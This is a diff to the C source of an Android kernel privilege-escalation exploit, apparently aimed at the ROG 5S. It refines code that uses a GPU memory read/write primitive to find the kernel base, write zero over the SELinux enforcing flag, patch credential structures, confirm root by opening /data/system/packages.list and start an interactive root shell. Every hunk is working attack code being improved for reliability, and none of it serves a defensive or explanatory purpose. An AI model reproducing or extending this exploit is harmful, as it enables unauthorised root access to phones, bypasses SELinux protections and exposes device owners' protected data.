@@ -1300,9 +1300,14 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
 
     // 2. Apply Verified Offsets (SELinux and Global Credentials)
     if (kernel_base != 0) {
-        // Strictly use verified SELINUX_OFFSET
-        selinux_enforcing = kernel_base + SELINUX_OFFSET;
-        fprintf(stderr, "[PARENT] Applying verified SELinux patch at 0x%lx...\n", (unsigned long)selinux_enforcing);
+        // Find SELinux enforcing bit dynamically if fixed offset fails
+        selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
+        if (selinux_enforcing == 0) {
+            selinux_enforcing = kernel_base + SELINUX_OFFSET;
+            fprintf(stderr, "[PARENT] Warning: SELinux dynamic discovery failed. Using fixed offset 0x%lx\n", (unsigned long)SELINUX_OFFSET);
+        }
+        
+        fprintf(stderr, "[PARENT] Applying SELinux patch at 0x%lx...\n", (unsigned long)selinux_enforcing);
         uint32_t zero = 0;
         gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
         
@@ -1311,6 +1316,11 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
         fprintf(stderr, "[PARENT] Patching global init_cred at 0x%lx...\n", (unsigned long)init_cred_va);
         patch_cred_via_gpu(fd, init_cred_va, 0);
 #endif
+    } else {
+        fprintf(stderr, "[PARENT] [!] KERNEL_BASE is 0. Attempting blind patching of fixed offsets...\n");
+        // Blind patch as last resort
+        uint32_t zero = 0;
+        gpu_write_task_virt(fd, 0xffffffc010000000ULL + SELINUX_OFFSET, (uint8_t *)&zero, 4);
     }
 
     // 3. Patch specific process credentials (most reliable)
@@ -1389,14 +1399,26 @@ shell:
     setresuid(0, 0, 0);
     setresgid(0, 0, 0);
 
+    // Robust verification: Try to read /data/system/packages.list (Root only)
+    int test_fd = open("/data/system/packages.list", O_RDONLY);
+    if (test_fd >= 0) {
+        fprintf(stderr, "[CHILD %d] [+++] ROOT VERIFIED: Successfully opened protected system file!\n", getpid());
+        close(test_fd);
+    } else {
+        fprintf(stderr, "[CHILD %d] [!] ROOT WARNING: Could not open protected file (errno=%d). SELinux might be active.\n", getpid(), errno);
+    }
+
     fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
     fprintf(stderr, "[CHILD %d] Verified identity: UID=%d GID=%d\n", getpid(), getuid(), getgid());
     fflush(stderr);
     
     // Set environment for root
-    setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp", 1);
+    setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp:/data/user/0/com.termux/files/usr/bin", 1);
     setenv("TERM", "xterm", 1);
     setenv("HOME", "/data/local/tmp", 1);
+
+    // Try to run id command via system first to show user
+    system("id");
 
     // Use execl for a cleaner shell transition
     execl("/system/bin/sh", "sh", "-i", NULL);
@@ -1492,18 +1514,21 @@ static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
     uint8_t task_data[4096];
     if (gpu_read_task_struct(fd, task_va, task_data, sizeof(task_data)) != 0) return 0;
 
+    fprintf(stderr, "[KBASE] Scanning task_struct at 0x%lx for kernel pointers...\n", (unsigned long)task_va);
+
     // Search for a kernel pointer in task_struct
     for (int off = 0; off < 4096 - 8; off += 8) {
         uint64_t ptr = *(uint64_t *)(task_data + off);
-        if ((ptr >> 48) == 0xffff) {
+        // Look for pointers in the 0xffffff80... to 0xffffff9f... range
+        if ((ptr >> 40) == 0xffffff) { 
             // Scan backwards from ptr in 2MB steps for ELF magic
             uint64_t start = ptr & ~0x1fffffULL;
-            for (int i = 0; i < 256; i++) { // Search up to 512MB backwards
+            for (int i = 0; i < 512; i++) { // Search up to 1GB backwards
                 uint64_t test_va = start - (i * 0x200000ULL);
                 uint32_t magic = 0;
                 if (gpu_read_task_struct(fd, test_va, (uint8_t *)&magic, 4) == 0) {
                     if (magic == 0x464c457f) { // \x7fELF
-                        fprintf(stderr, "[KBASE] Found ELF at 0x%lx (from ptr at task+0x%x)\n", (unsigned long)test_va, off);
+                        fprintf(stderr, "[KBASE] Found ELF at 0x%lx (from ptr 0x%lx at task+0x%x)\n", (unsigned long)test_va, (unsigned long)ptr, off);
                         return test_va;
                     }
                 }
@@ -1561,12 +1586,15 @@ static uint64_t find_kernel_base_auto(void)
         0xffffffc010000000ULL, // Most common for ROG 5S
         0xffffffc000000000ULL,
         0xffffffc008200000ULL,
+        0xffffff9550000000ULL, // Observed in your logs
+        0xffffff9540000000ULL,
+        0xffffff9560000000ULL,
         0xffffffc020000000ULL,
         0xffffffc030000000ULL,
         0xffffffc035000000ULL,
     };
 
-    for (int i = 0; i < 6; i++)
+    for (int i = 0; i < 9; i++)
     {
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, standard_bases[i], elf_magic, 4) == 0)
